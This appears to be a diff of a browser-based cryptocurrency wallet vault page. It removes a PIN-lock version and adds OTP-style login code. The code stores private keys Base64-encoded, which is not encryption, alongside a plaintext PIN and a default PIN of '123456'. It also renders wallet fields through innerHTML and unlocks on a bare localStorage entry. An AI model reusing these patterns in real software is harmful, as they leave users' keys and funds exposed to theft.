+    timerEl.style.color = remaining < 60000 ? '#ff4500' : '#ff8c00';
+  }, 1000);
+}
 
-            if (enteredPin === appState.userPin) {
-                // Successful login
-                appState.isLocked = false;
-                appState.failedAttempts = 0;
-                pinInput.value = '';
-                updateDisplay();
-                showMessage('Vault unlocked successfully!');
-                startAutoLockTimer();
-            } else {
-                // Failed login
-                appState.failedAttempts++;
-                appState.lastAttempt = Date.now();
-                pinInput.value = '';
-                
-                const remainingAttempts = SECURITY_CONFIG.maxAttempts - appState.failedAttempts;
-                if (remainingAttempts > 0) {
-                    showMessage(`Incorrect PIN. ${remainingAttempts} attempts remaining.`, 'error');
-                } else {
-                    showMessage('Maximum attempts exceeded. Vault locked for 5 minutes.', 'error');
-                }
-                
-                saveStoredData();
-            }
-        }
+function showMessage(element, text, type) {
+  element.textContent = text;
+  element.className = `msg ${type}`;
+  element.classList.remove('hidden');
+  
+  if (type === 'success') {
+    setTimeout(() => element.classList.add('hidden'), 3000);
+  }
+}
 
-        function lockVault() {
-            appState.isLocked = true;
-            clearAutoLockTimer();
-            updateDisplay();
-            showMessage('Vault locked securely.');
-        }
+function isValidEmail(email) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
 
-        function startAutoLockTimer() {
-            clearAutoLockTimer();
-            appState.autoLockTimer = setTimeout(() => {
-                lockVault();
-                showMessage('Vault auto-locked due to inactivity.', 'attempts-warning');
-            }, SECURITY_CONFIG.autoLockTime);
-        }
+window.addEventListener('DOMContentLoaded', function() {
+  const currentUser = localStorage.getItem('currentUser');
+  if (currentUser) {
+    document.getElementById('otpLogin').classList.add('hidden');
+    document.getElementById('vaultApp').style.display = 'block';
+    document.getElementById('userEmailDisplay').textContent = currentUser;
+  }
+});
+</script>
 
-        function clearAutoLockTimer() {
-            if (appState.autoLockTimer) {
-                clearTimeout(appState.autoLockTimer);
-                appState.autoLockTimer = null;
-            }
-        }
-
-        function resetAutoLockTimer() {
-            if (!appState.isLocked) {
-                startAutoLockTimer();
-            }
-        }
-
-        function updateDisplay() {
-            const lockScreen = document.getElementById('lockScreen');
-            const vaultInterface = document.getElementById('vaultInterface');
-
-            if (appState.isLocked) {
-                lockScreen.classList.remove('hidden');
-                vaultInterface.classList.add('hidden');
-            } else {
-                lockScreen.classList.add('hidden');
-                vaultInterface.classList.remove('hidden');
-                displayWallets();
-            }
-            updateOwnerDisplay();
-        }
-
-        function updateOwnerDisplay() {
-            const ownerNameElements = [
-                document.getElementById('ownerName'),
-                document.getElementById('vaultOwnerName')
-            ];
-            
-            const displayName = appState.ownerName ? `${appState.ownerName}'s Vault` : 'Vault Owner: Not Set';
-            
-            ownerNameElements.forEach(element => {
-                if (element) {
-                    element.textContent = displayName;
-                    if (appState.ownerName) {
-                        element.style.color = '#ff6b35';
-                    } else {
-                        element.style.color = '#a0a0a0';
-                    }
-                }
-            });
-
-            // Update subtitles when name is set
-            if (appState.ownerName) {
-                const lockSubtitle = document.getElementById('lockSubtitle');
-                const vaultSubtitle = document.getElementById('vaultSubtitle');
-                
-                if (lockSubtitle) {
-                    lockSubtitle.textContent = `Welcome back! Enter your PIN to access`;
-                }
-                if (vaultSubtitle) {
-                    vaultSubtitle.textContent = `Personal secure cryptocurrency storage`;
-                }
-            }
-        }
-
-        function showNameSetup() {
-            document.getElementById('nameSetupModal').classList.remove('hidden');
-            document.getElementById('ownerNameInput').value = appState.ownerName || '';
-            document.getElementById('nameMessage').innerHTML = '';
-        }
-
-        function showNameChange() {
-            if (appState.isLocked) {
-                showMessage('Please unlock the vault first to change name.', 'error');
-                return;
-            }
-            showNameSetup();
-        }
-
-        function hideNameSetup() {
-            document.getElementById('nameSetupModal').classList.add('hidden');
-            document.getElementById('ownerNameInput').value = '';
-        }
-
-        function showNameMessage(message, type = 'success') {
-            const messageDiv = document.getElementById('nameMessage');
-            messageDiv.innerHTML = `<div class="status-message ${type}">${message}</div>`;
-            setTimeout(() => messageDiv.innerHTML = '', 3000);
-        }
-
-        function setOwnerName() {
-            const nameInput = document.getElementById('ownerNameInput').value.trim();
-            
-            if (!nameInput) {
-                showNameMessage('Please enter a name or tag.', 'error');
-                return;
-            }
-
-            if (nameInput.length < 2) {
-                showNameMessage('Name must be at least 2 characters long.', 'error');
-                return;
-            }
-
-            if (nameInput.length > 30) {
-                showNameMessage('Name must be 30 characters or less.', 'error');
-                return;
-            }
-
-            // Basic validation for appropriate characters
-            if (!/^[a-zA-Z0-9\s\-_'\.]+$/.test(nameInput)) {
-                showNameMessage('Name can only contain letters, numbers, spaces, and basic punctuation.', 'error');
-                return;
-            }
-
-            // Set the name
-            appState.ownerName = nameInput;
-            saveStoredData();
-            updateOwnerDisplay();
-            
-            showNameMessage('Name tag set successfully! 🎉', 'success');
-            
-            setTimeout(() => {
-                hideNameSetup();
-                if (appState.isLocked) {
-                    showMessage(`Welcome ${nameInput}! Your vault is now personalized.`, 'success');
-                } else {
-                    showMessage('Name tag updated successfully!', 'success');
-                }
-            }, 1500);
-        }
-
-        function saveWallet() {
-            const wallet = {
-                id: Date.now(),
-                name: document.getElementById('walletName').value,
-                crypto: document.getElementById('cryptoType').value,
-                address: document.getElementById('walletAddress').value,
-                privateKey: encryptData(document.getElementById('privateKey').value),
-                notes: document.getElementById('notes').value,
-                created: new Date().toLocaleString()
-            };
-
-            if (!wallet.name || !wallet.address) {
-                showMessage('Please fill in wallet name and address.', 'error');
-                return;
-            }
-
-            appState.wallets.push(wallet);
-            saveStoredData();
-            clearForm();
-            displayWallets();
-            showMessage('Wallet saved securely!');
-        }
-
-        function deleteWallet(id) {
-            if (confirm('Are you sure you want to delete this wallet?')) {
-                appState.wallets = appState.wallets.filter(w => w.id !== id);
-                saveStoredData();
-                displayWallets();
-                showMessage('Wallet deleted.');
-            }
-        }
-
-        function displayWallets() {
-            const listDiv = document.getElementById('walletList');
-            
-            if (appState.wallets.length === 0) {
-                listDiv.innerHTML = '<p style="text-align: center; color: #a0a0a0; margin: 20px 0;">No wallets stored yet.</p>';
-                return;
-            }
-
-            listDiv.innerHTML = appState.wallets.map(wallet => `
-                <div class="wallet-item">
-                    <div class="wallet-name">${wallet.name}</div>
-                    <div class="wallet-info">
-                        <span><strong>Type:</strong> ${wallet.crypto}</span>
-                        <span><strong>Address:</strong> ${wallet.address.substring(0, 20)}...</span>
-                        <span><strong>Created:</strong> ${wallet.created}</span>
-                        ${wallet.notes ? `<span><strong>Notes:</strong> ${wallet.notes}</span>` : ''}
-                    </div>
-                    <div style="margin-top: 10px;">
-                        <button class="btn btn-secondary" onclick="viewPrivateKey('${wallet.id}')" style="width: auto; margin-right: 10px; padding: 8px 16px;">View Key</button>
-                        <button class="btn btn-danger" onclick="deleteWallet(${wallet.id})" style="width: auto; padding: 8px 16px;">Delete</button>
-                    </div>
-                </div>
-            `).join('');
-        }
-
-        function viewPrivateKey(id) {
-            const wallet = appState.wallets.find(w => w.id == id);
-            if (wallet) {
-                const decryptedKey = decryptData(wallet.privateKey);
-                alert(`Private Key/Seed for ${wallet.name}:\n\n${decryptedKey}\n\n⚠️ Keep this information secure!`);
-            }
-        }
-
-        function clearForm() {
-            document.getElementById('walletName').value = '';
-            document.getElementById('cryptoType').value = 'Bitcoin';
-            document.getElementById('walletAddress').value = '';
-            document.getElementById('privateKey').value = '';
-            document.getElementById('notes').value = '';
-        }
-
-        function exportVault() {
-            const exportData = {
-                wallets: appState.wallets,
-                exported: new Date().toISOString()
-            };
-            
-            const blob = new Blob([JSON.stringify(exportData, null, 2)], {type: 'application/json'});
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `crypto-vault-backup-${new Date().toISOString().slice(0,10)}.json`;
-            a.click();
-            URL.revokeObjectURL(url);
-            
-            showMessage('Vault exported successfully!');
-        }
-
-        // Simple encryption (Base64) - In production, use proper encryption
-        function encryptData(data) {
-            return btoa(unescape(encodeURIComponent(data)));
-        }
-
-        function decryptData(encryptedData) {
-            return decodeURIComponent(escape(atob(encryptedData)));
-        }
-
-        function saveStoredData() {
-            const dataToSave = {
-                wallets: appState.wallets,
-                failedAttempts: appState.failedAttempts,
-                lastAttempt: appState.lastAttempt,
-                userPin: appState.userPin,
-                ownerName: appState.ownerName
-            };
-            // In a real application, this would be saved to a secure local storage
-            sessionStorage.setItem('cryptoVaultData', JSON.stringify(dataToSave));
-        }
-
-        function loadStoredData() {
-            const savedData = sessionStorage.getItem('cryptoVaultData');
-            if (savedData) {
-                const data = JSON.parse(savedData);
-                appState.wallets = data.wallets || [];
-                appState.failedAttempts = data.failedAttempts || 0;
-                appState.lastAttempt = data.lastAttempt || 0;
-                appState.userPin = data.userPin || '123456';
-                appState.ownerName = data.ownerName || null;
-            }
-        }
-
-        function showPinSetup() {
-            document.getElementById('pinSetupModal').classList.remove('hidden');
-            document.getElementById('currentPinGroup').style.display = 'block';
-            document.getElementById('pinChangeBtn').textContent = 'Change PIN';
-            document.getElementById('pinMessage').innerHTML = '';
-            clearPinFields();
-        }
-
-        function showPinChange() {
-            if (appState.isLocked) {
-                showMessage('Please unlock the vault first to change PIN.', 'error');
-                return;
-            }
-            showPinSetup();
-        }
-
-        function hidePinSetup() {
-            document.getElementById('pinSetupModal').classList.add('hidden');
-            clearPinFields();
-        }
-
-        function clearPinFields() {
-            document.getElementById('currentPin').value = '';
-            document.getElementById('newPin').value = '';
-            document.getElementById('confirmPin').value = '';
-        }
-
-        function showPinMessage(message, type = 'success') {
-            const messageDiv = document.getElementById('pinMessage');
-            messageDiv.innerHTML = `<div class="status-message ${type}">${message}</div>`;
-            setTimeout(() => messageDiv.innerHTML = '', 3000);
-        }
-
-        function changePinCode() {
-            const currentPin = document.getElementById('currentPin').value.trim();
-            const newPin = document.getElementById('newPin').value.trim();
-            const confirmPin = document.getElementById('confirmPin').value.trim();
-
-            // Validation
-            if (!currentPin && appState.userPin !== '123456') {
-                showPinMessage('Please enter your current PIN.', 'error');
-                return;
-            }
-
-            if (appState.userPin !== '123456' && currentPin !== appState.userPin) {
-                showPinMessage('Current PIN is incorrect.', 'error');
-                return;
-            }
-
-            if (!newPin) {
-                showPinMessage('Please enter a new PIN.', 'error');
-                return;
-            }
-
-            if (newPin.length < 4 || newPin.length > 8) {
-                showPinMessage('PIN must be 4-8 digits long.', 'error');
-                return;
-            }
-
-            if (!/^\d+$/.test(newPin)) {
-                showPinMessage('PIN must contain only numbers.', 'error');
-                return;
-            }
-
-            if (newPin !== confirmPin) {
-                showPinMessage('PINs do not match. Please try again.', 'error');
-                return;
-            }
-
-            if (newPin === currentPin) {
-                showPinMessage('New PIN must be different from current PIN.', 'error');
-                return;
-            }
-
-            // Warn about weak PINs
-            if (isWeakPin(newPin)) {
-                if (!confirm('Warning: This PIN may be easy to guess. Common patterns like 1234, 0000, or repeated digits are not secure. Do you want to use it anyway?')) {
-                    return;
-                }
-            }
-
-            // Set new PIN
-            appState.userPin = newPin;
-            saveStoredData();
-            
-            showPinMessage('PIN changed successfully! 🎉', 'success');
-            
-            setTimeout(() => {
-                hidePinSetup();
-                if (appState.isLocked) {
-                    showMessage('New PIN set! You can now use it to unlock your vault.', 'success');
-                } else {
-                    showMessage('PIN updated successfully!', 'success');
-                }
-            }, 1500);
-        }
-
-        function isWeakPin(pin) {
-            // Check for common weak patterns
-            const weakPatterns = [
-                /^(\d)\1+$/, // All same digits (1111, 2222, etc.)
-                /^1234/, // Sequential ascending
-                /^4321/, // Sequential descending
-                /^0000/, // All zeros
-                /^1111/, // All ones
-                /^2222/, // All twos
-                /^9999/, // All nines
-            ];
-
-            return weakPatterns.some(pattern => pattern.test(pin)) || 
-                   pin === '0123' || pin === '3210' || 
-                   pin === '1357' || pin === '2468' ||
-                   pin === '8765' || pin === '5678';
-        }
-
-        function showInstructions() {
-            document.getElementById('instructionsModal').classList.remove('hidden');
-        }
-
-        function hideInstructions() {
-            document.getElementById('instructionsModal').classList.add('hidden');
-        }
-
-        // Clear data when page unloads for security
-        window.onbeforeunload = function() {
-            clearAutoLockTimer();
-        };
-    </script>
 </body>
 </html>
